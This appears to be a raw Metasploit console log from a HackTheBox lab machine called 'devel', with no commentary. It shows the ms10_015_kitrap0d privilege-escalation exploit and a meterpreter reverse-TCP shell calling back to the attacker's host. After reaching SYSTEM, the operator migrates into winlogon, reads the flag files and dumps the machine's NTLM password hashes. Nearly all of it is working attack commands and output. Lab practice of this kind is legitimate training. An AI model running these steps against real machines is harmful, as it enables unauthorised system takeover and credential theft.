+Module options (exploit/windows/local/ms10_015_kitrap0d):                                                      
+
+   Name     Current Setting  Required  Description     
+   ----     ---------------  --------  -----------     
+   SESSION                   yes       The session to run this module on.                                      
+
+
+Exploit target:            
+
+   Id  Name                
+   --  ----                
+   0   Windows 2K SP4 - Windows 7 (x86)                
+
+
+msf5 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 2                                                  
+SESSION => 2               
+msf5 exploit(windows/local/ms10_015_kitrap0d) > run    
+
+[*] Started reverse TCP handler on 192.168.84.128:4444                                                         
+[*] Launching notepad to host the exploit...           
+[+] Process 3036 launched. 
+[*] Reflectively injecting the exploit DLL into 3036...                                                        
+[*] Injecting exploit into 3036 ...                    
+[*] Exploit injected. Injecting payload into 3036...   
+[*] Payload injected. Executing exploit...             
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.                           
+[*] Exploit completed, but no session was created.     
+msf5 exploit(windows/local/ms10_015_kitrap0d) > options
+
+Module options (exploit/windows/local/ms10_015_kitrap0d):                                                      
+
+   Name     Current Setting  Required  Description     
+   ----     ---------------  --------  -----------     
+   SESSION  2                yes       The session to run this module on.                                      
+
+
+Payload options (windows/meterpreter/reverse_tcp):     
+
+   Name      Current Setting  Required  Description    
+   ----      ---------------  --------  -----------    
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)              
+   LHOST     192.168.84.128   yes       The listen address (an interface may be specified)                     
+   LPORT     4444             yes       The listen port                                                        
+
+
+Exploit target:            
+
+   Id  Name                
+   --  ----                
+   0   Windows 2K SP4 - Windows 7 (x86)                
+
+
+msf5 exploit(windows/local/ms10_015_kitrap0d) > set LHOST 10.10.14.7                                           
+LHOST => 10.10.14.7        
+msf5 exploit(windows/local/ms10_015_kitrap0d) > set LHOST 9002                                                 
+LHOST => 9002              
+msf5 exploit(windows/local/ms10_015_kitrap0d) > [*] 10.10.10.5 - Meterpreter session 2 closed.  Reason: Died   
+run                        
+
+[-] Exploit failed: Msf::OptionValidateError The following options failed to validate: SESSION.                
+[*] Exploit completed, but no session was created.     
+msf5 exploit(windows/local/ms10_015_kitrap0d) > use multi/handler                                              
+msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp                                      
+payload => windows/meterpreter/reverse_tcp             
+msf5 exploit(multi/handler) > option                   
+[-] Unknown command: option.                           
+msf5 exploit(multi/handler) > options                  
+
+Module options (exploit/multi/handler):                
+
+   Name  Current Setting  Required  Description        
+   ----  ---------------  --------  -----------        
+
+
+Payload options (windows/meterpreter/reverse_tcp):     
+
+   Name      Current Setting  Required  Description    
+   ----      ---------------  --------  -----------    
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)              
+   LHOST     10.10.14.7       yes       The listen address (an interface may be specified)                     
+   LPORT     9001             yes       The listen port                                                        
+
+
+Exploit target:            
+
+   Id  Name                
+   --  ----                
+   0   Wildcard Target     
+
+
+msf5 exploit(multi/handler) > run                      
+
+[*] Started reverse TCP handler on 10.10.14.7:9001     
+[*] Sending stage (180291 bytes) to 10.10.10.5         
+[*] Meterpreter session 3 opened (10.10.14.7:9001 -> 10.10.10.5:49157) at 2020-05-11 12:32:18 -0500            
+
+meterpreter > background   
+[*] Backgrounding session 3...                         
+msf5 exploit(multi/handler) > search kitrap0d          
+
+Matching Modules           
+================           
+
+   #  Name                                     Disclosure Date  Rank   Check  Description                      
+   -  ----                                     ---------------  ----   -----  -----------                      
+   0  exploit/windows/local/ms10_015_kitrap0d  2010-01-19       great  Yes    Windows SYSTEM Escalation via KiTrap0D                      
+
+
+msf5 exploit(multi/handler) > use 0                    
+msf5 exploit(windows/local/ms10_015_kitrap0d) > options
+
+Module options (exploit/windows/local/ms10_015_kitrap0d):                                                      
+
+   Name     Current Setting  Required  Description     
+   ----     ---------------  --------  -----------     
+   SESSION  2                yes       The session to run this module on.                                      
+
+
+Payload options (windows/meterpreter/reverse_tcp):     
+
+   Name      Current Setting  Required  Description    
+   ----      ---------------  --------  -----------    
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)              
+   LHOST     9002             yes       The listen address (an interface may be specified)                     
+   LPORT     4444             yes       The listen port                                                        
+
+
+Exploit target:            
+
+   Id  Name                
+   --  ----                
+   0   Windows 2K SP4 - Windows 7 (x86)                
+
+
+msf5 exploit(windows/local/ms10_015_kitrap0d) > set LHOST 10.10.14.7                                           
+LHOST => 10.10.14.7        
+msf5 exploit(windows/local/ms10_015_kitrap0d) > set LPORT 9002                                                 
+LPORT => 9002              
+msf5 exploit(windows/local/ms10_015_kitrap0d) > options
+
+Module options (exploit/windows/local/ms10_015_kitrap0d):                                                      
+
+   Name     Current Setting  Required  Description     
+   ----     ---------------  --------  -----------     
+   SESSION  2                yes       The session to run this module on.                                      
+
+
+Payload options (windows/meterpreter/reverse_tcp):     
+
+   Name      Current Setting  Required  Description    
+   ----      ---------------  --------  -----------    
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)              
+   LHOST     10.10.14.7       yes       The listen address (an interface may be specified)                     
+   LPORT     9002             yes       The listen port                                                        
+
+
+Exploit target:            
+
+   Id  Name                
+   --  ----                
+   0   Windows 2K SP4 - Windows 7 (x86)                
+
+
+msf5 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 3                                                  
+SESSION => 3               
+msf5 exploit(windows/local/ms10_015_kitrap0d) > run    
+
+[*] Started reverse TCP handler on 10.10.14.7:9002     
+[*] Launching notepad to host the exploit...           
+[+] Process 3748 launched. 
+[*] Reflectively injecting the exploit DLL into 3748...                                                        
+[*] Injecting exploit into 3748 ...                    
+[*] Exploit injected. Injecting payload into 3748...   
+[*] Payload injected. Executing exploit...             
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.                           
+[*] Sending stage (180291 bytes) to 10.10.10.5         
+[*] Meterpreter session 4 opened (10.10.14.7:9002 -> 10.10.10.5:49158) at 2020-05-11 12:34:49 -0500            
+
+meterpreter > getuid       
+Server username: NT AUTHORITY\SYSTEM                   
+meterpreter > ps           
+
+Process List               
+============               
+
+ PID   PPID  Name                    Arch  Session  User                          Path                         
+ ---   ----  ----                    ----  -------  ----                          ----                         
+ 0     0     [System Process]                                                                                  
+ 4     0     System                  x86   0                                                                   
+ 260   4     smss.exe                x86   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
+ 336   328   csrss.exe               x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 388   328   wininit.exe             x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe                         
+ 400   380   csrss.exe               x86   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 404   624   WmiPrvSE.exe            x86   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\wbem\wmiprvse.exe                   
+ 448   380   winlogon.exe            x86   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe                        
+ 492   388   services.exe            x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe                        
+ 512   388   lsass.exe               x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
+ 520   388   lsm.exe                 x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe  
+ 624   492   svchost.exe             x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe                         
+ 704   492   svchost.exe             x86   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe                         
+ 784   448   LogonUI.exe             x86   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe                         
+ 832   492   svchost.exe             x86   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe                         
+ 872   492   svchost.exe             x86   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe                         
+ 904   492   svchost.exe             x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe                         
+ 944   492   msdtc.exe               x86   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe
+ 1016  492   svchost.exe             x86   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe                         
+ 1092  492   svchost.exe             x86   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe                         
+ 1196  492   spoolsv.exe             x86   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe                         
+ 1232  492   svchost.exe             x86   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe                         
+ 1332  492   svchost.exe             x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe                         
+ 1400  492   svchost.exe             x86   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe                         
+ 1436  492   svchost.exe             x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe                         
+ 1524  492   VGAuthService.exe       x86   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe                
+ 1552  492   vmtoolsd.exe            x86   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmtoolsd.exe       
+ 1584  492   svchost.exe             x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe                         
+ 1984  492   dllhost.exe             x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\dllhost.exe                         
+ 2084  624   WmiPrvSE.exe            x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wbem\wmiprvse.exe                   
+ 2548  492   sppsvc.exe              x86   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\sppsvc.exe                          
+ 2588  492   svchost.exe             x86   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe                         
+ 2676  492   SearchIndexer.exe       x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\SearchIndexer.exe                   
+ 2768  2676  SearchProtocolHost.exe  x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\SearchProtocolHost.exe              
+ 2848  1584  w3wp.exe                x86   0        IIS APPPOOL\Web               c:\windows\system32\inetsrv\w3wp.exe                    
+ 3208  492   WmiApSrv.exe            x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wbem\WmiApSrv.exe                   
+ 3748  2848  notepad.exe             x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\notepad.exe                         
+ 3964  2676  SearchFilterHost.exe    x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\SearchFilterHost.exe                
+
+meterpreter > migrate 448  
+[*] Migrating from 3748 to 448...                      
+[*] Migration completed successfully.                  
+meterpreter > cd /         
+meterpreter > cd Users/Administrator/Desktop           
+meterpreter > cat root.txt 
+[-] stdapi_fs_stat: Operation failed: The system cannot find the file specified.                               
+meterpreter > ls           
+Listing: C:\Users\Administrator\Desktop                
+=======================================                
+
+Mode              Size  Type  Last modified              Name                                                  
+----              ----  ----  -------------              ----                                                  
+100666/rw-rw-rw-  282   fil   2017-03-17 18:16:53 -0500  desktop.ini                                           
+100444/r--r--r--  32    fil   2017-03-17 18:17:20 -0500  root.txt.txt                                          
+
+meterpreter > cat root.txt.txt                         
+e621a0b5041708797c4fc4728bc72b4bmeterpreter > cd /Users
+meterpreter > ls           
+Listing: C:\Users          
+=================          
+
+Mode              Size  Type  Last modified              Name                                                  
+----              ----  ----  -------------              ----                                                  
+40777/rwxrwxrwx   8192  dir   2017-03-17 18:16:43 -0500  Administrator                                         
+40777/rwxrwxrwx   0     dir   2009-07-13 23:53:55 -0500  All Users                                             
+40777/rwxrwxrwx   8192  dir   2017-03-17 18:06:26 -0500  Classic .NET AppPool                                  
+40555/r-xr-xr-x   8192  dir   2009-07-13 21:37:05 -0500  Default                                               
+40777/rwxrwxrwx   0     dir   2009-07-13 23:53:55 -0500  Default User                                          
+40555/r-xr-xr-x   4096  dir   2009-07-13 21:37:05 -0500  Public                                                
+40777/rwxrwxrwx   8192  dir   2017-03-17 09:17:37 -0500  babis                                                 
+100666/rw-rw-rw-  174   fil   2009-07-13 23:41:57 -0500  desktop.ini                                           
+
+meterpreter > cd babis     
+meterpreter > ls           
+Listing: C:\Users\babis    
+=======================    
+
+Mode              Size    Type  Last modified              Name                                                
+----              ----    ----  -------------              ----                                                
+40777/rwxrwxrwx   0       dir   2017-03-17 09:17:40 -0500  AppData                                             
+40777/rwxrwxrwx   0       dir   2017-03-17 09:17:40 -0500  Application Data                                    
+40555/r-xr-xr-x   0       dir   2017-03-17 09:17:44 -0500  Contacts                                            
+40777/rwxrwxrwx   0       dir   2017-03-17 09:17:40 -0500  Cookies                                             
+40555/r-xr-xr-x   0       dir   2017-03-17 09:17:40 -0500  Desktop                                             
+40555/r-xr-xr-x   4096    dir   2017-03-17 09:17:40 -0500  Documents                                           
+40555/r-xr-xr-x   0       dir   2017-03-17 09:17:40 -0500  Downloads                                           
+40555/r-xr-xr-x   4096    dir   2017-03-17 09:17:40 -0500  Favorites                                           
+40555/r-xr-xr-x   0       dir   2017-03-17 09:17:40 -0500  Links                                               
+40777/rwxrwxrwx   0       dir   2017-03-17 09:17:40 -0500  Local Settings                                      
+40555/r-xr-xr-x   0       dir   2017-03-17 09:17:40 -0500  Music                                               
+40777/rwxrwxrwx   0       dir   2017-03-17 09:17:40 -0500  My Documents                                        
+100666/rw-rw-rw-  524288  fil   2017-03-17 09:17:40 -0500  NTUSER.DAT                                          
+100666/rw-rw-rw-  65536   fil   2017-03-17 09:17:40 -0500  NTUSER.DAT{6cced2f1-6e01-11de-8bed-001e0bcd1824}.TM.blf                        
+100666/rw-rw-rw-  524288  fil   2017-03-17 09:17:40 -0500  NTUSER.DAT{6cced2f1-6e01-11de-8bed-001e0bcd1824}.TMContainer00000000000000000001.regtrans-ms               
+100666/rw-rw-rw-  524288  fil   2017-03-17 09:17:40 -0500  NTUSER.DAT{6cced2f1-6e01-11de-8bed-001e0bcd1824}.TMContainer00000000000000000002.regtrans-ms               
+40777/rwxrwxrwx   0       dir   2017-03-17 09:17:40 -0500  NetHood                                             
+40555/r-xr-xr-x   0       dir   2017-03-17 09:17:40 -0500  Pictures                                            
+40777/rwxrwxrwx   0       dir   2017-03-17 09:17:40 -0500  PrintHood                                           
+40777/rwxrwxrwx   0       dir   2017-03-17 09:17:40 -0500  Recent                                              
+40555/r-xr-xr-x   0       dir   2017-03-17 09:17:40 -0500  Saved Games                                         
+40555/r-xr-xr-x   0       dir   2017-03-17 09:17:52 -0500  Searches                                            
+40777/rwxrwxrwx   0       dir   2017-03-17 09:17:40 -0500  SendTo                                              
+40777/rwxrwxrwx   0       dir   2017-03-17 09:17:40 -0500  Start Menu                                          
+40777/rwxrwxrwx   0       dir   2017-03-17 09:17:40 -0500  Templates                                           
+40555/r-xr-xr-x   0       dir   2017-03-17 09:17:40 -0500  Videos                                              
+100666/rw-rw-rw-  262144  fil   2017-03-17 09:17:40 -0500  ntuser.dat.LOG1                                     
+100666/rw-rw-rw-  0       fil   2017-03-17 09:17:40 -0500  ntuser.dat.LOG2                                     
+100666/rw-rw-rw-  20      fil   2017-03-17 09:17:40 -0500  ntuser.ini                                          
+
+meterpreter > cd Desktop   
+lmeterpreter > ls          
+Listing: C:\Users\babis\Desktop                        
+===============================                        
+
+Mode              Size  Type  Last modified              Name                                                  
+----              ----  ----  -------------              ----                                                  
+100666/rw-rw-rw-  282   fil   2017-03-17 09:17:51 -0500  desktop.ini                                           
+100444/r--r--r--  32    fil   2017-03-17 18:14:21 -0500  user.txt.txt                                          
+
+meterpreter > cat user.txt.txt                         
+9ecdd6a3aedf24b41562fea70f4cb3e8meterpreter > hashdump 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a450f6000be7df50ee304d0a838d638f:::                         
+babis:1000:aad3b435b51404eeaad3b435b51404ee:a1133ec0f7779e215acc8a36922acf57:::                                
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                 
+meterpreter > exit         
+[*] Shutting down Meterpreter...                       
+
+[*] 10.10.10.5 - Meterpreter session 4 closed.  Reason: User exit                                              
+msf5 exploit(windows/local/ms10_015_kitrap0d) > exit   
+[*] You have active sessions open, to exit anyway type "exit -y"                                               
+msf5 exploit(windows/local/ms10_015_kitrap0d) > exit   
+[*] You have active sessions open, to exit anyway type "exit -y"                                               
+msf5 exploit(windows/local/ms10_015_kitrap0d) > exit   
+[*] You have active sessions open, to exit anyway type "exit -y"                                               
+msf5 exploit(windows/local/ms10_015_kitrap0d) > exit -y
+arjun@kali:~/Documents/HackTheBox/retired/devel$       
